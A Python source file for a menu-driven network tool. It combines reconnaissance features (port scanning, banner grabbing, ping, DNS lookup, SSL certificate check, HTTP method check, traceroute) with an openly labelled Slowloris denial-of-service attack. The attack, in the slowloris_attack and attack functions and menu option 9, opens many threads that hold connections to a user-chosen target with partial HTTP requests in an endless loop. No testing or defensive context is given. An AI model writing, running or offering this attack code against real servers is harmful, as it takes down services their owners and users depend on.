import socket
import requests
import threading
import subprocess
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor
import ssl
import dns.resolver
import smtplib
import time

# Constants
TIMEOUT = 5  # Timeout for connections
MAX_THREADS = 10  # Max concurrent threads for scanning

# Function to resolve a URL or IP
def resolve_target(target):
    """Resolve URL to IP address if it's a domain name, or return IP if it's already an IP address."""
    try:
        if not target.replace('.', '', 1).isdigit():  # If it's a domain name
            ip = socket.gethostbyname(target)
            return ip
        else:
            return target
    except socket.error as e:
        print(f"Error resolving {target}: {e}")
        return None

# Function to scan a single URL
def scan_url(url, port):
    try:
        parsed_url = urlparse(url)
        host = parsed_url.hostname
        protocol = parsed_url.scheme

        if not host:
            raise ValueError("Invalid URL")
        
        print(f"Scanning {url} on port {port}...")

        if protocol in ['http', 'https']:
            response = requests.get(url, timeout=TIMEOUT)
            print(f"Successfully connected to {url} on port {port}")
            print(f"HTTP Status Code: {response.status_code}")
            if 'Server' in response.headers:
                print(f"Server Information: {response.headers['Server']}")
        else:
            print(f"Unsupported protocol: {protocol} (only HTTP/HTTPS supported)")

    except requests.RequestException as e:
        print(f"Error connecting to {url} on port {port}: {e}")
    except ValueError as e:
        print(f"Invalid URL: {e}")

# Function to scan a single IP and port
def scan_ip(ip, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((ip, port))
            print(f"Successfully connected to {ip} on port {port}")
            service = get_service_info(ip, port)
            print(f"Service on port {port}: {service}")
    except socket.timeout:
        print(f"Timeout: Could not connect to {ip} on port {port}")
    except socket.error as e:
        print(f"Error connecting to {ip} on port {port}: {e}")

# Function to get service information based on the port
def get_service_info(ip, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((ip, port))
            banner = s.recv(1024).decode('utf-8', errors='ignore')
            if banner:
                return banner.strip()
            return "No banner available"
    except Exception as e:
        return "Unable to identify service"

# Function to scan multiple ports on a single IP
def scan_multiple_ports_ip(ip, ports):
    print(f"Scanning IP {ip} on multiple ports...")
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        executor.map(lambda port: scan_ip(ip, port), ports)

# Function to scan multiple ports on a URL (by changing the port and re-scanning)
def scan_multiple_ports_url(url, ports):
    print(f"Scanning URL {url} on multiple ports...")
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        executor.map(lambda port: scan_url(f"{url}:{port}", port), ports)

# Function to perform a ping scan
def scan_ping(target):
    resolved_target = resolve_target(target)
    if resolved_target:
        print(f"Pinging {resolved_target}...")
        try:
            response = subprocess.run(
                ['ping', '-c', '4', resolved_target] if not resolved_target.replace('.', '', 1).isdigit() else ['ping', resolved_target],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            
            if response.returncode == 0:
                print(f"Ping to {resolved_target} successful.")
                print(response.stdout)
            else:
                print(f"Ping to {resolved_target} failed.")
                print(response.stderr)
        except Exception as e:
            print(f"Error pinging {resolved_target}: {e}")
    else:
        print(f"Could not resolve {target}.")

# Function to scan for open ports (like Nmap)
def scan_open_ports(target, start_port=1, end_port=1024):
    resolved_target = resolve_target(target)
    if resolved_target:
        print(f"Scanning open ports on {resolved_target}...")
        open_ports = []
        
        for port in range(start_port, end_port + 1):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(TIMEOUT)
                    result = s.connect_ex((resolved_target, port))
                    if result == 0:
                        open_ports.append(port)
                        print(f"Port {port} is open")
            except socket.error as e:
                continue
        
        if open_ports:
            print(f"Open ports on {resolved_target}: {open_ports}")
        else:
            print(f"No open ports found on {resolved_target}.")
    else:
        print(f"Could not resolve {target}.")

# Function to perform DNS lookup
def scan_dns(target):
    try:
        resolved_target = resolve_target(target)
        if resolved_target:
            print(f"Performing DNS lookup for {resolved_target}...")
            try:
                dns_info = dns.resolver.resolve(target, 'A')
                print(f"DNS Records for {target}:")
                for ip in dns_info:
                    print(ip)
            except Exception as e:
                print(f"Error in DNS lookup: {e}")
        else:
            print(f"Could not resolve {target}.")
    except Exception as e:
        print(f"Error performing DNS lookup: {e}")

# Function to perform SSL Certificate Check
def scan_ssl(target):
    try:
        resolved_target = resolve_target(target)
        if resolved_target:
            print(f"Checking SSL Certificate for {resolved_target}...")
            context = ssl.create_default_context()
            with context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=resolved_target) as s:
                s.connect((resolved_target, 443))
                ssl_info = s.getpeercert()
                print(f"SSL Certificate Info for {resolved_target}:")
                print(f"Issuer: {ssl_info['issuer']}")
                print(f"Subject: {ssl_info['subject']}")
                print(f"Valid From: {ssl_info['notBefore']}")
                print(f"Valid To: {ssl_info['notAfter']}")
    except Exception as e:
        print(f"Error checking SSL certificate for {target}: {e}")

# Function to check HTTP methods on a server
def check_http_methods(url):
    try:
        response = requests.options(url)
        print(f"Allowed HTTP Methods for {url}:")
        print(response.headers.get('allow', 'No HTTP methods allowed header found'))
    except requests.RequestException as e:
        print(f"Error checking HTTP methods for {url}: {e}")

# Function to perform Traceroute
def traceroute(target):
    resolved_target = resolve_target(target)
    if resolved_target:
        print(f"Performing traceroute to {resolved_target}...")
        try:
            response = subprocess.run(['traceroute', resolved_target], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            print(response.stdout)
        except Exception as e:
            print(f"Error performing traceroute: {e}")
    else:
        print(f"Could not resolve {target}.")

# Slowloris DoS attack
def slowloris_attack(target, port=80, timeout=10):
    """
    Slowloris attack: Keeps the server's connections open and sends partial HTTP requests
    """
    # Create socket connection
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    
    try:
        sock.connect((target, port))
        print(f"Connected to {target}:{port}")
        
        # Send incomplete HTTP headers to keep the connection open
        request = f"GET / HTTP/1.1\r\nHost: {target}\r\n"
        while True:
            sock.send(request.encode('utf-8'))
            time.sleep(10)  # Sending requests periodically to keep connection open
            print(f"Sent data to {target}:{port}")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        sock.close()

def attack(target, port=80, threads=10):
    """
    Launches multiple Slowloris attacks to the target IP
    """
    threads_list = []
    for i in range(threads):
        thread = threading.Thread(target=slowloris_attack, args=(target, port))
        thread.start()
        threads_list.append(thread)
    
    # Wait for all threads to complete
    for thread in threads_list:
        thread.join()

# Main function to handle user input and initiate the scan
def main():
    while True:
        print("\nSelect an option:")
        print("1: Scan URL")
        print("2: Scan IP")
        print("3: Scan Ping")
        print("4: Scan Open Ports")
        print("5: Scan DNS")
        print("6: Scan SSL Certificate")
        print("7: Check HTTP Methods")
        print("8: Traceroute")
        print("9: Slowloris DoS Attack")
        print("10: Exit")
        
        option = input("Enter your choice (1-10): ")
        
        if option == "1":
            url = input("Enter the URL to scan: ")
            port = int(input("Enter the port: "))
            scan_url(url, port)
        elif option == "2":
            ip = input("Enter the IP address to scan: ")
            port = int(input("Enter the port: "))
            scan_ip(ip, port)
        elif option == "3":
            target = input("Enter the URL or IP to ping: ")
            scan_ping(target)
        elif option == "4":
            target = input("Enter the URL or IP to scan for open ports: ")
            start_port = int(input("Enter the start port: "))
            end_port = int(input("Enter the end port: "))
            scan_open_ports(target, start_port, end_port)
        elif option == "5":
            target = input("Enter the URL or IP to perform DNS lookup: ")
            scan_dns(target)
        elif option == "6":
            target = input("Enter the URL or IP to check SSL certificate: ")
            scan_ssl(target)
        elif option == "7":
            url = input("Enter the URL to check HTTP methods: ")
            check_http_methods(url)
        elif option == "8":
            target = input("Enter the URL or IP to perform traceroute: ")
            traceroute(target)
        elif option == "9":
            target = input("Enter the target IP or URL for Slowloris attack: ")
            attack(target)
        elif option == "10":
            print("Exiting program.")
            break
        else:
            print("Invalid option, please select again.")

if __name__ == "__main__":
    main()
